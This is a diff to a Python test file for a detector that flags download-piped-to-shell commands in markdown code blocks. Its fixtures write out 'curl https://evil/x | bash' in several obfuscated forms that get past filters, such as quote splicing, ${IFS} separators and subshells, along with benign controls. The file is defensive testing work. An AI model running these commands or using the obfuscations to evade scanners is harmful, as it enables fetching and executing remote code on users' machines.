@@ -2261,6 +2261,40 @@ def test_quoted_and_subshell_shell_token_detected():
     assert not find_dangerous_pipes('```\ncurl https://evil/x | grep "(bash)"\n```')
 
 
+def test_shell_deobfuscation_variants_detected_without_false_positives():
+    _scripts_on_path()
+    try:
+        from utils import find_dangerous_pipes
+    finally:
+        _pop_path()
+    # Common, bounded shell obfuscations of the shell token are all the same
+    # invocation: quote splicing, brace/subshell grouping, $() substitution and
+    # ${IFS} separators.
+    for body in (
+        'ba"sh"',
+        "ba'sh'",
+        "{ bash; }",
+        "bash${IFS}",
+        "bash${IFS}-c",
+        r"b\ash",
+        "(bash)",
+        "$(bash)",
+    ):
+        assert find_dangerous_pipes(f"```\ncurl https://evil/x | {body}\n```"), body
+    # Bounded de-obfuscation must not manufacture a shell out of benign commands.
+    for body in (
+        "grep bash",
+        "tee out.txt",
+        "command -v bash",
+        "a^b",
+        "shasum",
+        "bashful",
+        "echo `date`",
+        "grep -e 'sh'",
+    ):
+        assert not find_dangerous_pipes(f"```\ncurl https://evil/x | {body}\n```"), body
+
+
 def test_hidden_dir_credentials_are_scanned(tmp_path):
     _scripts_on_path()
     try:
